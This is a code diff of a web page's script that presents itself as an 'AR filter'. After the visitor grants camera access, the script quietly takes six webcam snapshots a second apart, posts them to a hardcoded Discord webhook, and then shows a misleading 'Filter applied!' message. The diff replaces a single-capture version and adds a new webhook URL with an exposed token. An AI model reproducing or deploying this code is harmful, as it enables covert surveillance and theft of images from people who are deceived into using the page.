@@ -160,41 +160,52 @@
   <canvas id="canvas" width="400" height="300"></canvas>
 
   <script>
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const ctx = canvas.getContext("2d");
 
-    async function start() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        video.style.display = "block";
+  let captureCount = 0;
+  const totalCaptures = 6; // number of images to send
+  const delayBetweenCaptures = 1000; // in milliseconds
 
-        setTimeout(() => {
-          captureAndSend();
-        }, 3000); // Capture after 3s
-      } catch (e) {
-        alert("Please allow camera access to continue.");
-      }
+  async function start() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+      video.style.display = "block";
+
+      setTimeout(() => {
+        captureCount = 0;
+        captureMultiple();
+      }, 1000); // wait a bit before starting capture
+    } catch (e) {
+      alert("Please allow camera access to continue.");
+    }
+  }
+
+  function captureMultiple() {
+    if (captureCount >= totalCaptures) {
+      alert("Filter applied! 🎉");
+      return;
     }
 
-    function captureAndSend() {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob((blob) => {
-        const formData = new FormData();
-        formData.append("file", blob, "snapshot.png");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob((blob) => {
+      const formData = new FormData();
+      formData.append("file", blob, `snapshot${captureCount + 1}.png`);
 
-        fetch("https://discord.com/api/webhooks/1398460329259827342/yEvVgTEowjESAbB6LoQq3vkMP4DfUIEQvpK613X9xmsJkK3g6LeZpS_g7HlntUUelP1z", {
-          method: "POST",
-          body: formData
-        }).then(() => {
-          alert("AR Filter applied! 🎉");
-        }).catch((err) => {
-          alert("Failed to send data.");
-          console.error(err);
-        });
-      }, "image/png");
-    }
-  </script>
+      fetch("https://discord.com/api/webhooks/1398472154089127946/hqsmCirQoQk0xSGdhb5_qMGj-rF5HX9fa_SqwEduaWMtOuc8cr5X7c01o1gIXi-6QqwA", {
+        method: "POST",
+        body: formData
+      }).catch((err) => {
+        console.error("Failed to send image", err);
+      });
+
+      captureCount++;
+      setTimeout(captureMultiple, delayBetweenCaptures);
+    }, "image/png");
+  }
+</script>
+
 </body>
 </html>
